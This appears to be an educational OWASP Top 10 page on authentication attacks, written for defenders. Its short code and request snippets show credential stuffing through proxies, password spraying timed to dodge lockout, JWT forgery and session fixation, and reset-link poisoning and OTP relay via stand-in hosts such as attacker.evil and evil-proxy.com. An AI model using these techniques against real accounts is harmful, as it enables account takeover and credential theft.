# Authentication Failures (2025) - Attack Vectors

## Table of Contents
- [Understanding Authentication Attacks](#understanding-authentication-attacks)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining the Vectors](#chaining-the-vectors)
- [What's Next?](#whats-next)

## Understanding Authentication Attacks

> **⚠ EDUCATIONAL PURPOSE ONLY** — these techniques are shown so you can find and fix them in systems you own or are explicitly authorised to test. Attacking accounts you do not own is illegal.

Authentication is attractive to attackers because success gives them a *legitimate* identity rather than an exploit that might be detected. Most of these attacks are cheap, automatable, and driven by data the attacker already has — billions of leaked credentials, a target's public email format, or a misread of how the server validates a token. The failure is usually in **process and configuration**, not in a single line of vulnerable code.

The attacker's objective in this category is almost always one of:

- Obtain a valid credential (guess it, replay it, or phish it).
- Forge or reuse a session or token so no credential is needed.
- Abuse a recovery or federation flow to mint a credential legitimately.

## Core Attack Flow

```
1. Enumerate
   |
   Discover valid usernames/emails via login, signup, reset responses + timing
2. Acquire
   |
   Credential stuffing, spraying, brute force, or AitM phishing
3. Bypass second factor
   |
   MFA fatigue, SMS SIM-swap, real-time OTP relay
4. Take over the session
   |
   Fixation, stolen cookie, forged JWT, weak reset token
5. Persist
   |
   Long-lived tokens, added MFA device, mail-forwarding rule
```

## Common Attack Patterns

### 1. Credential Stuffing

Replaying username/password pairs leaked from unrelated breaches. Because users reuse passwords, even a 0.1–2% hit rate is profitable at scale.

```python
# Attacker replays a breach dump against the login endpoint
for user, pw in load_breach_dump("collection.txt"):
    r = requests.post("https://target/login",
                      json={"email": user, "password": pw},
                      proxies=random_residential_proxy())
    if r.status_code == 200 and "Set-Cookie" in r.headers:
        save_hit(user, pw)          # reused password -> account takeover
```

**Enablers**: no rate limiting, no breach screening, no MFA, no bot/device intelligence.

### 2. Password Spraying

The inverse of brute force: try *one* common password against *many* accounts, staying under per-account lockout thresholds.

```python
common = ["Winter2025!", "Company@123", "Welcome1"]
for pw in common:
    for user in employee_emails:          # one attempt per account per round
        try_login(user, pw)
    sleep(3600)                           # slow enough to dodge lockout windows
```

**Enablers**: predictable passwords, per-account-only lockout (no per-source or global view), no anomaly detection.

### 3. Brute Force Against Weak Policy

```python
# A 4-digit PIN or a short numeric password is exhaustible in seconds
for code in range(0, 10000):
    if try_login(user, f"{code:04d}"):
        break                              # ~10k guesses = trivial
```

**Enablers**: short/weak password requirements (CWE-521), unthrottled endpoints (CWE-307).

### 4. Username / Account Enumeration

Different responses — in body, status code, or *timing* — reveal which accounts exist, sharpening every other attack.

```
POST /login   {"email":"real@corp.com","password":"x"}
  -> 200  "Incorrect password"          # account EXISTS

POST /login   {"email":"nope@corp.com","password":"x"}
  -> 200  "No account with that email"  # account does NOT exist

# Timing oracle: real accounts run bcrypt (slow), fake ones return early (fast)
real  -> 240 ms   |   fake -> 15 ms
```

**Enablers**: distinct error messages, distinct timing, reset/signup flows that confirm existence.

### 5. Session Fixation

The attacker plants a known session ID, tricks the victim into authenticating with it, and — because the server never rotates the ID on login — inherits the now-authenticated session.

```
1. Attacker gets a valid anonymous session:  SID=abc123
2. Attacker lures victim to  https://target/?sessionid=abc123
3. Victim logs in; server KEEPS SID=abc123 (no rotation)  <-- the bug
4. Attacker uses SID=abc123 -> now fully authenticated as the victim
```

**Enablers**: session ID accepted from URL/param, no regeneration on privilege change (CWE-384).

### 6. Predictable / Weak Session Identifiers

```python
# VULNERABLE: sequential or low-entropy IDs are guessable
session_id = str(last_id + 1)              # 1001, 1002, 1003 ...
session_id = str(random.randint(0, 99999)) # only 100k values

# Attacker walks the space or predicts the next value -> hijack
```

**Enablers**: non-CSPRNG identifiers, short length, structure that leaks issuance order.

### 7. Missing Logout / Session Invalidation

```
# Client "logs out" but the server never revokes the token/session
DELETE cookie on browser  != server-side invalidation

# Stolen cookie or JWT keeps working until it expires (which may be "never")
```

**Enablers**: stateless tokens with no deny-list, sessions never deleted on logout, no absolute timeout (CWE-613).

### 8. Insecure Password Reset — Weak Token

```python
# VULNERABLE: guessable / non-expiring reset token
token = md5(email + str(int(time.time())))   # low entropy, time-correlated
GET /reset?token=... <- never expires, reusable

# Attacker predicts or brute-forces the token and resets the victim's password
```

**Enablers**: predictable tokens, no expiry, multi-use tokens, no re-auth (CWE-640).

### 9. Password Reset — Host Header / Link Poisoning

```
POST /forgot-password
Host: attacker.evil                        # server trusts the Host header
{"email":"victim@corp.com"}

# Server builds the email link from the Host header:
#   https://attacker.evil/reset?token=SECRET
# Victim clicks -> token is delivered to the attacker
```

**Enablers**: reset links built from the request `Host`/`X-Forwarded-Host` instead of a trusted, configured origin.

### 10. MFA Fatigue / Push Bombing

```python
# Attacker already has the password; they spam approval prompts
while not approved:
    trigger_push(victim)                   # "Approve sign-in?" x50
    # eventually the victim taps Approve to make it stop
```

**Enablers**: simple approve/deny push (no number matching), no prompt rate-limit, no anomaly signals.

### 11. Real-Time OTP Relay (Adversary-in-the-Middle)

```
Victim -> [ evil-proxy.com ] -> real-site.com
  1. Victim enters password on the proxy; proxy forwards it
  2. Real site prompts for OTP; proxy shows the prompt to the victim
  3. Victim enters OTP; proxy forwards it in real time
  4. Real site returns a SESSION COOKIE; proxy steals it
  -> password + phishable MFA both defeated
```

**Enablers**: phishable factors (SMS/TOTP/simple push); defeated by origin-bound WebAuthn.

### 12. JWT "alg: none" and Algorithm Confusion

```
# alg:none -- verifier accepts an UNSIGNED token
{"alg":"none","typ":"JWT"}.{"sub":"victim","role":"admin"}.   <- empty signature

# RS256 -> HS256 confusion -- verifier uses the PUBLIC key as an HMAC secret
sign(header={"alg":"HS256"}, payload, key=known_rsa_public_key)
# If the server verifies HS256 with that public key, the forgery validates
```

**Enablers**: verifier lets the token pick the algorithm; secret reused/weak; no `exp`/`iss`/`aud` checks.

### 13. JWT Missing Expiry / Audience Validation

```python
# Token is signed correctly but the server never checks context:
#   - no exp  -> token valid forever
#   - no aud  -> a token minted for service A is accepted by service B
#   - no iss  -> a token from any issuer with the same key is trusted
decoded = jwt.decode(token, key, options={"verify_exp": False})  # the bug
```

**Enablers**: disabled or skipped claim validation; overly long lifetimes; shared keys across audiences.

### 14. OAuth2 / OIDC redirect_uri and state Abuse

```
# Loose redirect_uri matching leaks the authorization code:
GET /authorize?client_id=app&redirect_uri=https://app.evil/cb&response_type=code
# If the AS matches by prefix/substring, the code is sent to the attacker.

# Missing 'state' -> login CSRF / account linking:
# Attacker completes an auth flow, injects THEIR code into the victim's
# browser; victim's account gets linked to the attacker's identity.
```

**Enablers**: non-exact redirect matching, missing/unverified `state`, missing PKCE on public clients (CWE-346).

## Chaining the Vectors

Real intrusions combine these. A representative chain:

```
Enumerate valid emails (pattern 4)
   -> Password spray a common password (pattern 2)
   -> Land on an account with reused creds (pattern 1)
   -> Defeat SMS OTP via SIM swap, or push via fatigue (patterns 10/11)
   -> Session never rotates / never expires (patterns 5,7)
   -> Add attacker MFA device + long-lived token for persistence
```

The defensive takeaway: because the vectors chain, defenses must be **layered**. Closing enumeration alone, or adding phishable MFA alone, still leaves a viable path. The [Prevention](./prevention.md) page addresses each link.

## What's Next?

- **[Prevention](./prevention.md)**: layered defenses with real code and configuration.
- **[Examples](./examples.md)**: vulnerable-vs-secure code across languages and token/session/MFA config.
- **[Overview](./overview.md)**: concepts, impact, and the 2025 edition framing.
- **[Lab](./lab/authentication-failures/)**: practice identifying and fixing these vulnerabilities.

---

*Part of the [OWASP Top 10 Educational Repository](/)*
